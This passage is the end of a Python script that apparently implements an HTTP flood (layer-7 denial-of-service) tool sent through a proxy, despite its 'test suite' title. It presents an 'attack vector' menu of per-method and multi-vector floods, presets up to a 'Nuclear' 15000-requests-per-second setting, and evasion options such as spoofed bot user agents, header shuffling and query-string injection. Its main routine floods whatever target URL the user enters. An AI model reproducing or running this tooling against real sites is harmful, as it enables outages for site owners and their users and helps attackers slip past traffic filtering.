    ok("Combined RPS   : {}{:.0f}{}".format(BOLD, combined_rps, RESET))
    print("\n  {:<10} {:>8} {:>8} {:>8} {:>8}".format("Method", "Sent", "2xx", "Fail", "RPS"))
    print("  {}".format("─"*46))
    for r in sorted(results, key=lambda x: x["method"]):
        print("  {}{:<10}{}  {:>8,}  {}{:>8,}{}  {}{:>8,}{}  {:>8.0f}".format(
            CYAN, r["method"], RESET, r["total"],
            GREEN, r["success"], RESET,
            RED, r["errors"], RESET,
            r["rps_actual"],
        ))
    print("\n{}{}{}{}".format(BOLD, MAGENTA, "="*60, RESET))
    print()


# ─────────────────────────────────────────────────────────────────────────────
# Interactive helpers
# ─────────────────────────────────────────────────────────────────────────────

def _prompt_int(prompt, default):
    # type: (str, int) -> int
    try:
        raw = input("  {}{}{} [{}]: ".format(BOLD, prompt, RESET, default)).strip()
        return int(raw) if raw else default
    except (ValueError, KeyboardInterrupt, EOFError):
        return default


def _prompt_float(prompt, default):
    # type: (str, float) -> float
    try:
        raw = input("  {}{}{} [{}]: ".format(BOLD, prompt, RESET, default)).strip()
        return float(raw) if raw else default
    except (ValueError, KeyboardInterrupt, EOFError):
        return default


ATTACK_MENU = [
    ("Diagnostic (10 sequential tests)",  "diag"),
    ("GET Flood",                          "GET"),
    ("POST Flood",                         "POST"),
    ("HEAD Flood",                         "HEAD"),
    ("PUT Flood",                          "PUT"),
    ("PATCH Flood",                        "PATCH"),
    ("DELETE Flood",                       "DELETE"),
    ("OPTIONS Flood",                      "OPTIONS"),
    ("Multi-Vector (all methods at once)", "multi"),
]


def show_menu():
    # type: () -> str
    print("\n{}{}\u250c{}{}\u2500{}{}{}\u2510{}".format(
        BOLD, CYAN, RESET, BOLD+CYAN, "\u2500"*45, BOLD, CYAN, RESET, ""))
    print("{}{}  \u2502{}  {}SELECT ATTACK VECTOR{}                    {}{}  \u2502{}".format(
        BOLD, CYAN, RESET, BOLD, RESET, BOLD, CYAN, RESET))
    print("{}{}\u251c{}{}\u2500{}{}{}\u2524{}".format(
        BOLD, CYAN, RESET, BOLD+CYAN, "\u2500"*45, BOLD, CYAN, RESET, ""))
    for i, (label, key) in enumerate(ATTACK_MENU, 1):
        icon = "\u26a1" if key == "multi" else ("\U0001f50d" if key == "diag" else "\U0001f4a5")
        print("{}{}  \u2502{}  {}{:>2}.{} {}  {:<38}{}{}  \u2502{}".format(
            BOLD, CYAN, RESET, BOLD, i, RESET, icon, label, BOLD, CYAN, RESET))
    print("{}{}\u2514{}{}\u2500{}{}{}\u2518{}".format(
        BOLD, CYAN, RESET, BOLD+CYAN, "\u2500"*45, BOLD, CYAN, RESET, ""))

    while True:
        try:
            raw = input("\n  {}Enter choice (1\u2013{}): {}".format(
                BOLD, len(ATTACK_MENU), RESET)).strip()
            idx = int(raw) - 1
            if 0 <= idx < len(ATTACK_MENU):
                label, mode = ATTACK_MENU[idx]
                print("  {}\u2714  Selected:{} {}{}{}".format(GREEN, RESET, BOLD, label, RESET))
                return mode
            warn("Please enter a number between 1 and {}".format(len(ATTACK_MENU)))
        except (ValueError, KeyboardInterrupt, EOFError):
            print("\nAborted.")
            sys.exit(0)


# ─────────────────────────────────────────────────────────────────────────────
# Flood Preset table
# (label, conns, rps, dur, ua_profile, hdr_shuffle, qs_mode)
# ─────────────────────────────────────────────────────────────────────────────
_PRESETS = [
    # label                                conns    rps   dur   ua_profile        shuf   qs
    ("Light    – legit desktop",              25,    50,   30, "legit_desktop",  False, "off"),
    ("Medium   – legit desktop",              50,   500,   60, "legit_desktop",  False, "off"),
    ("Heavy    – legit desktop",             100,  2000,   60, "legit_desktop",  False, "off"),
    ("Light    – legit mobile",               25,    50,   30, "legit_mobile",   False, "off"),
    ("Medium   – legit mobile",               50,   500,   60, "legit_mobile",   False, "off"),
    ("Light    – spoofed bots",               25,    50,   30, "spoofed_bots",   False, "off"),
    ("Medium   – spoofed bots + shuffle",     50,   500,   60, "spoofed_bots",   True,  "random"),
    ("Heavy    – full evasion + QS",         100,  2000,   60, "spoofed_evasion",True,  "always"),
    ("Blitz    – rotate + shuffle",          150,  5000,   30, "rotate",         True,  "random"),
    ("Nuclear  – rotate + shuffle",          300, 15000,   30, "rotate",         True,  "always"),
    ("Custom   – set your own values",         0,     0,    0, "",               False, "off"),
]


def show_preset_menu():
    # type: () -> Tuple[int, float, float]
    hdr = "{:<34} {:>5} {:>6} {:>5}  {:<18} {:^7} {:^8}".format(
        "Preset", "Conns", "RPS", "Dur", "UA Profile", "Shuffle", "QS")
    div = "\u2500" * 90

    print("\n{}{}  \u2500\u2500 Flood Preset \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500{}".format(BOLD, CYAN, RESET))
    print("  {}{}{}".format(DIM, hdr, RESET))
    print("  {}{}{}".format(DIM, div, RESET))

    for i, (label, conns, rps, dur, ua, shuf, qs) in enumerate(_PRESETS, 1):
        is_custom = (conns == 0)
        conns_s = "\u2013" if is_custom else str(conns)
        rps_s   = "\u2013" if is_custom else str(rps)
        dur_s   = "\u2013" if is_custom else "{}s".format(dur)
        ua_s    = "you choose" if is_custom else ua
        shuf_s  = "\u2013" if is_custom else ("\u2713" if shuf else "\u2717")
        qs_s    = "\u2013" if is_custom else qs
        row = "{:>2}. {:<30} {:>5} {:>6} {:>5}  {:<18} {:^7} {:^8}".format(
            i, label, conns_s, rps_s, dur_s, ua_s, shuf_s, qs_s)
        colour = MAGENTA if is_custom else (YELLOW if "Nuclear" in label else CYAN)
        print("  {}{}{}".format(colour, row, RESET))

    while True:
        try:
            raw = input("\n  {}Select preset (1\u2013{}): {}".format(
                BOLD, len(_PRESETS), RESET)).strip()
            if not raw:
                continue
            idx = int(raw) - 1
            if not (0 <= idx < len(_PRESETS)):
                warn("Enter 1\u2013{}".format(len(_PRESETS)))
                continue
        except (ValueError, KeyboardInterrupt, EOFError):
            print("\nAborted.")
            sys.exit(0)

        label, conns, rps, dur, ua, shuf, qs = _PRESETS[idx]

        if conns == 0:
            print("\n{}{}  \u2500\u2500 Custom Parameters \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500{}".format(BOLD, CYAN, RESET))
            conns = _prompt_int("Concurrent connections", 50)
            rps   = _prompt_float("Target RPS", 1000.0)
            dur   = _prompt_float("Duration (seconds)", 30.0)

            print("\n  {}UA Profile:{} (1) rotate  (2) legit_desktop  (3) legit_mobile  (4) spoofed_bots  (5) spoofed_evasion".format(BOLD, RESET))
            _ua_opts = ["rotate", "legit_desktop", "legit_mobile", "spoofed_bots", "spoofed_evasion"]
            try:
                ua_raw = input("  {}Choice [1]: {}".format(BOLD, RESET)).strip()
                ua_idx = int(ua_raw) - 1 if ua_raw else 0
                ua = _ua_opts[ua_idx] if 0 <= ua_idx < len(_ua_opts) else "rotate"
            except (ValueError, KeyboardInterrupt, EOFError):
                ua = "rotate"

            try:
                shuf_raw = input("  {}Shuffle header order? (y/n) [n]: {}".format(BOLD, RESET)).strip().lower()
                shuf = shuf_raw in ("y", "yes", "1")
            except (KeyboardInterrupt, EOFError):
                shuf = False

            print("  {}Query-string inject:{} (1) off  (2) random 50%  (3) always".format(BOLD, RESET))
            _qs_opts = ["off", "random", "always"]
            try:
                qs_raw = input("  {}Choice [1]: {}".format(BOLD, RESET)).strip()
                qs_idx = int(qs_raw) - 1 if qs_raw else 0
                qs = _qs_opts[qs_idx] if 0 <= qs_idx < len(_qs_opts) else "off"
            except (ValueError, KeyboardInterrupt, EOFError):
                qs = "off"

        _EVASION_PROFILE[0] = ua
        _HEADER_SHUFFLE[0]  = shuf
        _QS_INJECT[0]       = qs

        shuf_display = "{}on{}".format(GREEN, RESET) if shuf else "{}off{}".format(DIM, RESET)
        print("\n  {}\u2714  Preset:{} {}{}{}".format(GREEN, RESET, BOLD, label, RESET))
        info("UA profile : {}{}{}".format(BOLD, ua, RESET))
        info("Hdr shuffle: {}".format(shuf_display))
        info("QS inject  : {}{}{}".format(BOLD, qs, RESET))

        return int(conns), float(rps), float(dur)


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────
def main():
    print("\n{}{}{}".format(BOLD, "="*60, RESET))
    print("{}  L7 Proxy Test Suite \u2014 Squid @ {}:{}{}".format(
        BOLD, PROXY_HOST, PROXY_PORT, RESET))
    print("{}{}{}".format(BOLD, "="*60, RESET))
    print("{}  Started : {}{}".format(
        DIM, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), RESET))

    try:
        raw = input("\n{}  Enter target URL (e.g. https://example.com): {}".format(
            BOLD, RESET)).strip()
    except (KeyboardInterrupt, EOFError):
        print("\nAborted.")
        sys.exit(0)

    if not raw:
        fail("No URL provided. Exiting.")
        sys.exit(1)

    if not raw.startswith("http://") and not raw.startswith("https://"):
        raw = "https://" + raw

    parsed     = urllib.parse.urlparse(raw)
    target_url = raw
    hostname   = parsed.hostname or ""
    use_https  = parsed.scheme == "https"
    tls_port   = parsed.port or 443

    print("\n{}  Target URL : {}{}".format(DIM, target_url, RESET))
    print("{}  Hostname   : {}{}".format(DIM, hostname, RESET))
    print("{}  Proxy      : {}{}".format(DIM, PROXY_URL, RESET))

    if not test_proxy_reachability():
        fail("Proxy is unreachable \u2014 aborting.")
        sys.exit(1)

    mode = show_menu()

    if mode == "diag":
        test_egress_ip()
        if hostname and not all(c.isdigit() or c == "." for c in hostname):
            test_dns(hostname)
        test_http_get(target_url)
        test_http_head(target_url)
        test_http_options(target_url)
        test_redirect_chain(target_url)
        if use_https and hostname:
            test_tls(hostname, port=tls_port)
        test_http_post(target_url)
        test_latency(target_url)
        print("\n{}{}{}".format(BOLD+GREEN, "="*60, RESET))
        print("{}  All L7 tests complete.{}".format(BOLD+GREEN, RESET))
        print("{}{}{}".format(BOLD+GREEN, "="*60, RESET))
        print()
        return

    workers, rps, duration = show_preset_menu()
    print("\n{}  Workers : {}  |  RPS target : {:.0f}  |  Duration : {:.0f}s{}".format(
        DIM, workers, rps, duration, RESET))

    if mode == "multi":
        run_multi_vector(target_url, workers=workers, rps=rps, duration=duration)
    else:
        run_flood(target_url=target_url, workers=workers, rps=rps,
                  duration=duration, method=mode)
        print("\n{}{}{}".format(BOLD+GREEN, "="*60, RESET))
        print("{}  Flood complete.{}".format(BOLD+GREEN, RESET))
        print("{}{}{}".format(BOLD+GREEN, "="*60, RESET))
        print()


if __name__ == "__main__":
    main()
